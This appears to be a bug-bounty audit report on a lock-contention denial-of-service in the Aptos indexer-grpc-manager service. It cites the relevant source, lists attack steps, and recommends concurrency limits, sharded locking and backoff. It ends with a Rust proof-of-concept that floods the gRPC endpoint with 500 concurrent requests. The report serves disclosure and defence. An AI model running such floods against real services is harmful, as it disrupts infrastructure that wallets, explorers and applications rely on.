# Audit Report

## Title
Lock Contention DoS in Indexer-gRPC Manager Cache Operations

## Summary
The indexer-grpc-manager's `DataManager` uses a single coarse-grained `RwLock` to protect its transaction cache without any rate limiting or concurrency controls on incoming requests. An attacker can flood the service with concurrent read requests, causing write lock starvation and triggering a pathological garbage collection loop that repeatedly acquires write locks every 100ms, blocking all client requests and causing system-wide performance degradation of the indexer service.

## Finding Description

The `DataManager` struct protects its transaction cache with a single `RwLock<Cache>`: [1](#0-0) 

When clients request transactions via the public gRPC endpoint, the service processes each request by acquiring a read lock and iterating through transactions while cloning up to 20MB of data: [2](#0-1) [3](#0-2) 

The actual read lock is held during transaction processing: [4](#0-3) 

Each read request holds the lock while iterating and cloning transactions: [5](#0-4) 

Meanwhile, the background `start()` loop needs write locks to perform garbage collection and add new transactions. When the cache fills beyond `max_cache_size` (5GB by default) and the file store is lagging, the system enters a pathological garbage collection loop: [6](#0-5) [7](#0-6) 

This loop repeatedly acquires write locks every 100ms, blocking ALL read operations during each acquisition. 

Critically, the gRPC server has no concurrency limits: [8](#0-7) 

**Attack Path:**

1. Attacker opens hundreds of concurrent connections to the gRPC endpoint
2. Floods the service with `GetTransactions` requests with varying `starting_version` parameters
3. Each request acquires a read lock while processing up to 20MB of transactions
4. Multiple concurrent read locks delay write operations (GC and adding new transactions)
5. Cache fills up because transactions can't be added fast enough
6. When cache exceeds 5GB, the GC loop activates
7. GC loop repeatedly tries to acquire write locks every 100ms
8. Each write lock attempt blocks all ongoing and new read requests
9. If file store is lagging (common under load), GC cannot free space, and loop continues indefinitely
10. All client requests experience severe delays or timeouts
11. Indexer service becomes effectively unavailable

## Impact Explanation

This qualifies as **Medium Severity** per the Aptos bug bounty criteria for the following reasons:

1. **Service Availability Impact**: The attack causes severe degradation of the indexer-grpc service, which is critical infrastructure for querying historical blockchain data. All users—including wallets, explorers, and dApps—experience service disruption.

2. **No Data Loss**: Unlike Critical vulnerabilities, this does not cause loss of funds, consensus violations, or data corruption. The service can recover once the attack stops.

3. **Application-Level Vulnerability**: This is not a simple volumetric network flood (which would be out of scope), but rather exploits a specific design flaw: the combination of coarse-grained locking, unlimited concurrency, and pathological GC behavior.

4. **Infrastructure Component**: While not a validator consensus component, the indexer service is essential Aptos infrastructure referenced in official documentation and maintained in the core repository.

The severity matches "State inconsistencies requiring intervention" from the Medium category, as the service enters a degraded state requiring manual intervention or service restart.

## Likelihood Explanation

**HIGH likelihood** due to:

1. **Zero Barriers to Entry**: The gRPC endpoint is publicly accessible with no authentication or rate limiting
2. **Simple Attack**: Requires only a basic gRPC client capable of making concurrent requests
3. **Natural Trigger Conditions**: High blockchain activity naturally fills the cache, making the system vulnerable even without malicious intent
4. **No Detection**: No monitoring or alerting specifically for lock contention patterns
5. **Realistic Scenario**: The file store can legitimately lag during high load or infrastructure issues, creating the conditions for the GC loop to activate

The attack is trivial to execute and requires no special privileges or knowledge beyond the public gRPC API specification.

## Recommendation

Implement multiple defense layers:

**1. Add Request Rate Limiting:**
```rust
// In grpc_manager.rs
use tower::limit::ConcurrencyLimit;

let service = ConcurrencyLimit::new(
    GrpcManagerServer::new(...)
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE),
    MAX_CONCURRENT_REQUESTS // e.g., 100
);
```

**2. Implement Finer-Grained Locking:**
Replace the single coarse-grained `RwLock` with a sharded approach or lock-free data structures to reduce contention:
```rust
struct Cache {
    // Shard the cache into multiple segments with independent locks
    shards: Vec<RwLock<CacheShard>>,
    // ... other fields
}
```

**3. Add Backpressure in GC Loop:**
Instead of spinning every 100ms indefinitely, implement exponential backoff and return errors to clients when the system is overloaded:
```rust
if self.cache.write().await.maybe_gc() {
    backoff_ms = 100;
    break;
} else {
    backoff_ms = std::cmp::min(backoff_ms * 2, 5000);
    tokio::time::sleep(Duration::from_millis(backoff_ms)).await;
    if retries > MAX_GC_RETRIES {
        return Err(Status::resource_exhausted("Cache full, try again later"));
    }
}
```

**4. Add Request Timeout:**
Set maximum processing time per request to prevent clients from holding locks indefinitely.

**5. Add Monitoring:**
Track lock wait times and active request counts to detect DoS attempts.

## Proof of Concept

```rust
// Proof of Concept: Concurrent request flood
// Place in ecosystem/indexer-grpc/indexer-grpc-manager/tests/lock_contention_dos.rs

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, GetTransactionsRequest,
};
use std::time::Instant;
use tokio::task::JoinSet;

#[tokio::test]
async fn test_lock_contention_dos() {
    // Assume indexer-grpc-manager is running on localhost:50051
    let endpoint = "http://localhost:50051";
    
    // Spawn 500 concurrent requests
    let mut tasks = JoinSet::new();
    let start = Instant::now();
    
    for i in 0..500 {
        let endpoint = endpoint.to_string();
        tasks.spawn(async move {
            let mut client = GrpcManagerClient::connect(endpoint)
                .await
                .expect("Failed to connect");
            
            let request = GetTransactionsRequest {
                starting_version: Some(i * 1000), // Different versions
                transactions_count: None,
                batch_size: None,
                transaction_filter: None,
            };
            
            let start = Instant::now();
            let result = client.get_transactions(request).await;
            let latency = start.elapsed();
            
            (latency, result.is_ok())
        });
    }
    
    // Wait for all requests and measure latencies
    let mut successful = 0;
    let mut total_latency = std::time::Duration::ZERO;
    let mut max_latency = std::time::Duration::ZERO;
    
    while let Some(result) = tasks.join_next().await {
        if let Ok((latency, success)) = result {
            if success {
                successful += 1;
                total_latency += latency;
                max_latency = max_latency.max(latency);
            }
        }
    }
    
    let total_time = start.elapsed();
    let avg_latency = total_latency / successful.max(1);
    
    println!("Total time: {:?}", total_time);
    println!("Successful requests: {}/500", successful);
    println!("Average latency: {:?}", avg_latency);
    println!("Max latency: {:?}", max_latency);
    
    // Under DoS, expect:
    // - Many requests timeout or fail
    // - Average latency > 10 seconds
    // - Max latency > 30 seconds
    assert!(
        avg_latency > std::time::Duration::from_secs(10),
        "Expected severe latency degradation, got {:?}",
        avg_latency
    );
}
```

**To reproduce:**
1. Start indexer-grpc-manager service
2. Run the test: `cargo test --test lock_contention_dos`
3. Observe severe latency increases and potential timeouts
4. Monitor cache metrics showing `IS_FILE_STORE_LAGGING=1` and repeated GC attempts
5. All concurrent and subsequent requests experience degraded performance

## Notes

This vulnerability specifically affects the **indexer-grpc-manager service**, which is ecosystem infrastructure for serving historical transaction data, not a core validator consensus component. However, it represents a critical availability issue for applications relying on this service for blockchain data access. The combination of unlimited concurrency, coarse-grained locking, and the pathological GC loop creates a perfect storm for DoS attacks that can render the indexer service effectively unavailable under sustained concurrent request patterns.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L92-143)
```rust
    fn get_transactions(
        &self,
        start_version: u64,
        max_size_bytes: usize,
        update_file_store_version: bool,
    ) -> Vec<Transaction> {
        if !update_file_store_version {
            trace!(
            "Requesting version {start_version} from cache, update_file_store_version = {update_file_store_version}.",
        );
            trace!(
                "Current data range in cache: [{}, {}).",
                self.start_version,
                self.start_version + self.transactions.len() as u64
            );
        }
        if start_version < self.start_version {
            return vec![];
        }

        let mut transactions = vec![];
        let mut size_bytes = 0;
        for transaction in self
            .transactions
            .iter()
            .skip((start_version - self.start_version) as usize)
        {
            size_bytes += transaction.encoded_len();
            transactions.push(transaction.clone());
            if size_bytes > max_size_bytes {
                // Note: We choose to not pop the last transaction here, so the size could be
                // slightly larger than the `max_size_bytes`. This is fine.
                break;
            }
        }
        if update_file_store_version {
            if !transactions.is_empty() {
                let old_version = self
                    .file_store_version
                    .fetch_add(transactions.len() as u64, Ordering::SeqCst);
                let new_version = old_version + transactions.len() as u64;
                FILE_STORE_VERSION_IN_CACHE.set(new_version as i64);
                info!("Updated file_store_version in cache to {new_version}.");
            }
        } else {
            trace!(
                "Returned {} transactions from Cache, total {size_bytes} bytes.",
                transactions.len()
            );
        }
        transactions
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L146-153)
```rust
pub(crate) struct DataManager {
    // TODO(grao): Putting a big lock for now, if necessary we can explore some solution with less
    // locking / lock-free.
    cache: RwLock<Cache>,
    file_store_reader: FileStoreReader,
    metadata_manager: Arc<MetadataManager>,
    allow_fn_fallback: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L235-256)
```rust
                loop {
                    trace!("Maybe running GC.");
                    if self.cache.write().await.maybe_gc() {
                        IS_FILE_STORE_LAGGING.set(0);
                        trace!("GC is done, file store is not lagging.");
                        break;
                    }
                    IS_FILE_STORE_LAGGING.set(1);
                    // If file store is lagging, we are not inserting more data.
                    let cache = self.cache.read().await;
                    warn!("Filestore is lagging behind, cache is full [{}, {}), known_latest_version ({}).",
                          cache.start_version,
                          cache.start_version + cache.transactions.len() as u64,
                          self.metadata_manager.get_known_latest_version());
                    tokio::time::sleep(Duration::from_millis(100)).await;
                    if watch_file_store_version {
                        self.update_file_store_version_in_cache(
                            &cache, /*version_can_go_backward=*/ false,
                        )
                        .await;
                    }
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L374-384)
```rust
    pub(crate) async fn get_transactions_from_cache(
        &self,
        start_version: u64,
        max_size: usize,
        update_file_store_version: bool,
    ) -> Vec<Transaction> {
        self.cache
            .read()
            .await
            .get_transactions(start_version, max_size, update_file_store_version)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L14-14)
```rust
const MAX_SIZE_BYTES_FROM_CACHE: usize = 20 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L129-146)
```rust
    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L44-49)
```rust
const fn default_cache_config() -> CacheConfig {
    CacheConfig {
        max_cache_size: 5 * (1 << 30),
        target_cache_size: 4 * (1 << 30),
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-104)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```
